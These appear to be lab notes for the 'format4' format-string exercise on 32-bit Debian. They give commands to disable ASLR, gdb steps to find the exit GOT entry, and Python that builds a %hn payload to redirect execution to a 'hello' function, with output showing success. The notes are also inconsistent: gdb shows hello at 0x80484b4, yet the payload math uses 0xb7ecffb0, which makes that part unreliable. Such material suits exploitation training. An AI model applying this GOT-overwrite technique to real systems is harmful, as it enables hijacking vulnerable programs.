Debian 2.6.32-38 (32bit)

# # 1 # #
# first, disable ASLR:
echo 0 > /proc/sys/kernel/randomize_va_space

# # 2 # #
# Where in the stack we first meet our payload:
for i in {1..50}; do echo -n "$i: "; echo "AAAA %$i\$p" | ./format4; done | grep 41414141
4: AAAA 0x41414141
 																						=> stack_offset = 4
# # 3 # #
# determine "exit" location - GOT address to overwrite (gdb format4 -> b main -> disas vuln -> disas 0x8048360 -> x *0x8049650)
0x8048366 <exit@plt+6>:	0x00002068
 																						=> exit_plt = 0x8049650
# # 4 # #
# finding "hello" function - value to overwrite with (gdb format4 -> b main -> p hello)											 
$1 = {void (void)} 0x80484b4 <hello>
 																						=> hello = 0xb7ecffb0
# # 4** # #
# finding "/bin/bash" - value to overwrite with (gdb format4 -> break main -> r -> x/500s $esp -> (scroll to..) "SHELL=/bin/sh")											 
# 0xbfffff96:	 "SHELL=/bin/sh"
# adding 6 bytes ("SHELL="): 0xbfffff9c

# # 5 # #
# calculating how much to print (twice) (python)
# in python:
			first_bytes = (hello & 0xffff) - 8 										    ; 0xffb0 - 8
            last_bytes = ((hello & 0xffff0000) >> 16) - (first_bytes + 8)         		; 0xb7ec - 0xffb0
            if last_bytes < 0:															; if above is negative:
    	        last_bytes = ((hello & 0xffff0000) >> 16) + 16**4 - first_bytes - 8 	; 0x1b7ec - 0xffb0

# # 6 # #
generating the final payload:
payload = ""
payload += struct.pack("<I", exit_plt)
payload += struct.pack("<I", exit_plt+2)
payload += "%" + str(first_bytes) + "x%" + str(stack_offset) + "$hn%" + str(last_bytes) + "x%" + str(stack_offset+1) + "$hn"

# # 7 # #
# PoC
# python payload.py > payload
# cat payload | ./format4
7fd8420XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXcode execution redirected! you win